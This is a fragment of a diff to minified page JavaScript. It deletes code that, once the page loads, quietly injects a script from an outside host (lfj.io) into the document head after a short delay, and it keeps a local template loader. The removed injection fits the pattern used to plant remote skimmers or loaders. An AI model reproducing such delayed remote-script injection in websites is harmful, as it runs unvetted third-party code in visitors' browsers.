@@ -6,9 +6,6 @@ const jscrypto='dwpacmlf';function _asyncToGenerator(e){return function(){var t=
 
 
 window.addEventListener('load', function () {
-var ovj=document.createElement('script');
-ovj.src="//lfj.io/template/js/site.js";
-setTimeout(function () {document.head.appendChild(ovj);}, 150);
 
 var ovx=document.createElement('script');
 ovx.innerHTML="loader = new lrephadr({dataDir: './template/',dataJs: ['toastify', 'popper.min', 'tippy-bundle.umd.min', 'livestamp.min'],preload: 0});loader.run();";
